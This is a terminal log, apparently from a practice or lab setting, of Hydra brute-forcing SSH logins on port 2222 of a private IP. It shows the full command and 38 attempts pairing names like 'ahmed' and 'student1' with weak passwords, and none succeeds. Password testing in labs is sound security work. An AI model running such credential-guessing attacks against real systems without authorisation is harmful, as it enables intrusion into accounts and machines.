                                                                               
┌──(xendi㉿shadow)-[~]
└─$ hydra -L users.txt -P passwords.txt -s 2222 -V ssh://192.168.9.6
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 11:20:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 35 login tries (l:5/p:7), ~3 tries per task
[DATA] attacking ssh://192.168.9.6:2222/
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "123456" - 1 of 35 [child 0] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "password" - 2 of 35 [child 1] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "2025" - 3 of 35 [child 2] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "ahmed" - 4 of 35 [child 3] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "mohamed" - 5 of 35 [child 4] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "admin" - 6 of 35 [child 5] (0/0)
[ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "test" - 7 of 35 [child 6] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "123456" - 8 of 35 [child 7] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "password" - 9 of 35 [child 8] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "2025" - 10 of 35 [child 9] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "ahmed" - 11 of 35 [child 10] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "mohamed" - 12 of 35 [child 11] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "admin" - 13 of 35 [child 12] (0/0)
[ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "test" - 14 of 35 [child 13] (0/0)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "123456" - 15 of 35 [child 14] (0/0)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "password" - 16 of 35 [child 15] (0/0)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "2025" - 17 of 38 [child 10] (0/3)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "ahmed" - 18 of 38 [child 2] (0/3)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "mohamed" - 19 of 38 [child 3] (0/3)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "admin" - 20 of 38 [child 5] (0/3)
[ATTEMPT] target 192.168.9.6 - login "aicha" - pass "test" - 21 of 38 [child 6] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "123456" - 22 of 38 [child 7] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "password" - 23 of 38 [child 9] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "2025" - 24 of 38 [child 12] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "ahmed" - 25 of 38 [child 15] (0/3)
[RE-ATTEMPT] target 192.168.9.6 - login "student1" - pass "123456" - 25 of 38 [child 0] (0/3)
[RE-ATTEMPT] target 192.168.9.6 - login "student1" - pass "password" - 25 of 38 [child 1] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "mohamed" - 26 of 38 [child 11] (0/3)
[RE-ATTEMPT] target 192.168.9.6 - login "student1" - pass "ahmed" - 26 of 38 [child 15] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "admin" - 27 of 38 [child 0] (0/3)
[ATTEMPT] target 192.168.9.6 - login "student1" - pass "test" - 28 of 38 [child 9] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "123456" - 29 of 38 [child 7] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "password" - 30 of 38 [child 11] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "2025" - 31 of 38 [child 0] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "ahmed" - 32 of 38 [child 2] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "mohamed" - 33 of 38 [child 3] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "admin" - 34 of 38 [child 5] (0/3)
[ATTEMPT] target 192.168.9.6 - login "webuser" - pass "test" - 35 of 38 [child 6] (0/3)
[REDO-ATTEMPT] target 192.168.9.6 - login "aicha" - pass "123456" - 36 of 38 [child 10] (1/3)
[REDO-ATTEMPT] target 192.168.9.6 - login "mohamed " - pass "mohamed" - 37 of 38 [child 12] (2/3)
[REDO-ATTEMPT] target 192.168.9.6 - login "ahmed" - pass "password" - 38 of 38 [child 9] (3/3)
[STATUS] 38.00 tries/min, 38 tries in 00:01h, 1 to do in 00:01h, 8 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 11:22:40
                                                                                                                                                                        
┌──(xendi㉿shadow)-[~]
└─$ 
